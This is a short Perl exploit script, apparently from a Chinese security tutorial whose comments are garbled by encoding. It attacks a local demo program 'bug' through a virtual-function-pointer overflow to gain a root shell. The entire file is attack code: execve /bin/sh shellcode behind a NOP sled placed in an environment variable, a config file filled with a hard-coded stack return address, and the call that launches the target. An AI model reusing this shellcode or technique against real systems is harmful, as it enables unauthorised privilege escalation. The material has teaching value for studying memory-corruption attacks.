#!/usr/bin/perl
# ex.pl
#
# ��������͸��������ʾ����
# ���ߣ�san, alert7, eyas, watercloud
#
# ���ڹ���bug.cpp�������麯��ָ�����ִ��shellcode���Ӷ����rootȨ��
#
%ENV={};
$SHELL="1\xc0PPP[YZ4\xd0\xcd\x80";
$SHELL.="j\x0bX\x99Rhn/shh//biT[RSTY\xcd\x80";

$ENV{KKK}="\x90"x 128 . $SHELL;

open $f,">bug.conf" || die "open file bug.conf error.";

print $f "AA" , "\xff\xbf\x80\xff" x 100,"\n"; #ADDR: 0xbfffff80
close($f);

exec "./bug";
#EOF
